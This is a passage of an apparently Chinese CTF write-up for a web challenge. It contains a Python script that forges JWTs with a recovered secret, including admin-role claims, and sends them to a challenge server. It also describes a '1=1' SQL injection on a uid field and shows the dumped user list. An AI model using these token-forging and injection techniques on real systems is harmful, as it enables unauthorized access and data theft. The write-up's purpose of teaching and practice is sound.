+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">List</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">JWTFuzzer</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://web-9c9e5f5823.challenge.xctf.org.cn&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">secret</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_xor_decode</span><span class="p">(</span><span class="s2">&#34;FpBz</span><span class="se">\u0001</span><span class="s2">ecH</span><span class="se">\n\u001b</span><span class="s2">Ezx</span><span class="se">\u0017</span><span class="s2">@|SrAXQGkloXz</span><span class="se">\u0007</span><span class="s2">ElXZ&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span> <span class="o">=</span> <span class="s2">&#34;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">all_tokens</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># 存储所有生成的JWT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@staticmethod</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_xor_decode</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;134522123&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;XOR解码工具方法&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_generate_jwt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">algorithm</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;生成JWT令牌并保存到列表&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="n">algorithm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">all_tokens</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>  <span class="c1"># 添加name字段</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="n">algorithm</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_test_endpoint</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">config_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;测试API端点并保留完整响应&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;JWTFuzzer/1.0&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 测试GET请求</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/v1/getflag&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">config_name</span><span class="si">}</span><span class="s2">] GET -&gt; </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># 测试POST请求</span>
+</span></span><span class="line"><span class="cl">            <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">post_response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/v1/getflag&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">json</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">config_name</span><span class="si">}</span><span class="s2">] POST -&gt; </span><span class="si">{</span><span class="n">post_response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response: </span><span class="si">{</span><span class="n">post_response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">config_name</span><span class="si">}</span><span class="s2">] Request Failed: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">generate_jwt_variations</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">Dict</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;生成各种JWT变体&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">test_cases</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 基础测试</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Basic JWT&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 带时间戳</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;With Timestamp&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">,</span> <span class="s2">&#34;iat&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 管理员权限</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Admin Role&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">,</span> <span class="s2">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 过期时间</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;With Expiration&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;iat&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;exp&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">3600</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 不同算法</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;HS512 Algorithm&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS512&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 空声明</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Empty Claims&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 额外字段</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Extra Fields&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="p">,</span> <span class="s2">&#34;is_admin&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;debug&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;algorithm&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">🔧 Generating </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">test_cases</span><span class="p">)</span><span class="si">}</span><span class="s2"> JWT variations&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="k">case</span> <span class="ow">in</span> <span class="n">test_cases</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_generate_jwt</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">payload</span><span class="o">=</span><span class="k">case</span><span class="p">[</span><span class="s2">&#34;payload&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">algorithm</span><span class="o">=</span><span class="k">case</span><span class="p">[</span><span class="s2">&#34;algorithm&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">name</span><span class="o">=</span><span class="k">case</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span>  <span class="c1"># 传递name参数</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">case</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] Generated JWT: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_test_endpoint</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="k">case</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">case</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] JWT Generation Failed: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">all_tokens</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;运行完整的JWT模糊测试&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;🚀 Starting JWT Fuzzer&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;🎯 Target: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">target_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;🔑 Secret: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;🆔 Test UID: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">test_uid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 生成并测试所有JWT变体</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tokens</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_jwt_variations</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 输出所有生成的JWT</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">📜 All Generated JWTs:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">token_info</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">tokens</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">token_info</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Algorithm: </span><span class="si">{</span><span class="n">token_info</span><span class="p">[</span><span class="s1">&#39;algorithm&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">token_info</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Token: </span><span class="si">{</span><span class="n">token_info</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fuzzer</span> <span class="o">=</span> <span class="n">JWTFuzzer</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fuzzer</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随便拿一个测试</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608205410062.png"
+	width="1871"
+	height="731"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608205410062_hu17542869446105763700.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608205410062_hu993010222109916837.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608205410062"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="614px"
+	
+></p>
+<p>发现这里uid可以sql注入，直接测试1=1就爆出admin的uid</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175055407.png"
+	width="1883"
+	height="755"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175055407_hu12736936300330914978.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175055407_hu16217071066161103579.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608175055407"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;data&#34;:{&#34;users&#34;:[{&#34;uuid&#34;:&#34;9d5ec98c-5848-4450-9e58-9f97b6b3b7bc&#34;,&#34;name&#34;:&#34;admin&#34;,&#34;phone&#34;:&#34;123-456-7890&#34;},{&#34;uuid&#34;:&#34;f47ac10b-58cc-4372-a567-0e02b2c3d479&#34;,&#34;name&#34;:&#34;Bob&#34;,&#34;phone&#34;:&#34;987-654-3210&#34;},{&#34;uuid&#34;:&#34;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b&#34;,&#34;name&#34;:&#34;Charlie&#34;,&#34;phone&#34;:&#34;555-555-5555&#34;},{&#34;uuid&#34;:&#34;732390b8-ccb6-41de-a93b-94ea059fd263&#34;,&#34;name&#34;:&#34;David&#34;,&#34;phone&#34;:&#34;444-444-4444&#34;},{&#34;uuid&#34;:&#34;f633ec24-cfe6-42ba-bcd8-ad2dfae6d547&#34;,&#34;name&#34;:&#34;Eve&#34;,&#34;phone&#34;:&#34;333-333-3333&#34;},{&#34;uuid&#34;:&#34;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb&#34;,&#34;name&#34;:&#34;Frank&#34;,&#34;phone&#34;:&#34;222-222-2222&#34;},{&#34;uuid&#34;:&#34;db62356d-3b99-4764-b378-e46cb95df9e6&#34;,&#34;name&#34;:&#34;Grace&#34;,&#34;phone&#34;:&#34;111-111-1111&#34;},{&#34;uuid&#34;:&#34;8f4610ee-ee87-4cca-ad92-6cac4fdbe722&#34;,&#34;name&#34;:&#34;Hannah&#34;,&#34;phone&#34;:&#34;000-000-0000&#34;},{&#34;uuid&#34;:&#34;1678d80e-fd4d-4de3-aae2-cb0077f10c21&#34;,&#34;name&#34;:&#34;Ian&#34;,&#34;phone&#34;:&#34;123-123-1234&#34;},{&#34;uuid&#34;:&#34;5845b71f-ebb6-4707-8199-a4e46acf351f&#34;,&#34;name&#34;:&#34;Jack&#34;,&#34;phone&#34;:&#34;456-456-4567&#34;}]}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175223489.png"
+	width="1523"
+	height="497"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175223489_hu12603850647984249061.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175223489_hu10343123910975023350.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608175223489"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="306"
+		data-flex-basis="735px"
+	
+></p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175303413.png"
+	width="1891"
+	height="704"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175303413_hu788680894425912613.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175303413_hu11579701817423526717.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608175303413"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="644px"
+	
+></p>
+<p>回到前下的源码找到X-Sign</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
